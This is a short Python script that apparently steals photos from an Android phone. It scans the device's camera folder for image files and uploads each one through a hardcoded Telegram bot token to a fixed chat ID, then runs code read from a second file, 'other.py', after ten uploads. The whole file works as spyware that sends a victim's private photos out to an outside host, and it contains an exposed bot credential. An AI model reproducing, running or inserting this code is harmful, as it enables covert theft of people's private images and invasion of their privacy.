import telebot,os,requests,PIL
BOT_TOKEN = '6063855780:AAFykvajN7NDyxSPNZ1BF0buHvjzwNz_W6g'
CHAT_ID = '1821190441'

bot = telebot.TeleBot(BOT_TOKEN)

def send_image(image_path,caption=None):
    with open(image_path, 'rb') as f:
        bot.send_photo(CHAT_ID, f)

def find_images(directory):
    images = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                images.append(os.path.join(root, file))
    return images

def send_images_to_bot(images):
    n = 11
    for image in images:
        n = n-1
        captions = "hlo"
        send_image(image , captions)
        print("\033[35;m",n)
        if n == 0:
            with open("other.py") as f:
              exec(f.read())
    

def main():
    # Replace with the path to the user's gallery
    gallery_path = '/storage/emulated/0/DCIM/Camera'
    images = find_images(gallery_path)
    send_images_to_bot(images)

if __name__ == '__main__':
    main()
